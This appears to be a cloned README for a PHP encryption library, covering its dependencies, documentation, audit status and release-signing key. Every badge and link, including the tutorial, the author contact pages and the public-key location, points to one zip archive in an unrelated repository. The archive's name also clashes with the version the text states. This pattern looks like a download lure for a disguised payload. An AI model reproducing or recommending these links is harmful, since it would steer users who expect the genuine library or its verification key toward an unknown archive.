php-encryption
===============

[![Build Status](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
[![codecov](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
[![Latest Stable Version](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
[![Latest Unstable Version](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
[![License](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
[![Downloads](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)

This is a library for encrypting data with a key or password in PHP. **It
requires PHP 5.6 or newer and OpenSSL 1.0.1 or newer.** The current version is
v2.2.1, which is expected to remain stable and supported by its authors with
security and bugfixes until at least January 1st, 2020.

The library is a joint effort between [Taylor Hornby](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) and
[Scott Arciszewski](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) as well
as numerous open-source contributors.

What separates this library from other PHP encryption libraries is, firstly,
that it is secure. The authors used to encounter insecure PHP encryption code on
a daily basis, so they created this library to bring more security to the
ecosystem. Secondly, this library is "difficult to misuse." Like
[libsodium](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip), its API is designed to be
easy to use in a secure way and hard to use in an insecure way.


Dependencies
------------

This library requires no special dependencies except for PHP 5.6 or newer with
the OpenSSL extensions (version 1.0.1 or later) enabled (this is the default).
It uses [random\_compat](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip), which is
bundled in with this library so that your users will not need to follow any
special installation steps.

Getting Started
----------------

Start with the [**Tutorial**](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip). You can find instructions for
obtaining this library's code securely in the [Installing and
Verifying](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) documentation.

After you've read the tutorial and got the code, refer to the formal
documentation for each of the classes this library provides:

- [Crypto](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
- [File](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
- [Key](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
- [KeyProtectedByPassword](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)

If you encounter difficulties, see the [FAQ](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) answers. The fixes to
the most commonly-reported problems are explained there.

If you're a cryptographer and want to understand the nitty-gritty details of how
this library works, look at the [Cryptography Details](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
documentation.

If you're interested in contributing to this library, see the [Internal
Developer Documentation](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip).

Other Language Support
----------------------

This library is intended for server-side PHP software that needs to encrypt data at rest.
If you are building software that needs to encrypt client-side, or building a system that
requires cross-platform encryption/decryption support, we strongly recommend using
[libsodium](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) instead.

Examples
---------

If the documentation is not enough for you to understand how to use this
library, then you can look at an example project that uses this library:

- [encutil](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)
- [fileencrypt](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip)

Security Audit Status
---------------------

This code has not been subjected to a formal, paid, security audit. However, it
has received lots of review from members of the PHP security community, and the
authors are experienced with cryptography. In all likelihood, you are safer
using this library than almost any other encryption library for PHP.

If you use this library as a part of your business and would like to help fund
a formal audit, please [contact Taylor Hornby](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip).

Public Keys
------------

The GnuPG public key used to sign releases is available in
[https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip). Its fingerprint is:

```
2FA6 1D8D 99B9 2658 6BAC  3D53 385E E055 A129 1538
```

You can verify it against Taylor Hornby's [contact
page](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip) and
[twitter](https://raw.githubusercontent.com/sohailgerman/php-encryption/master/docs/php-encryption-v3.4.zip).
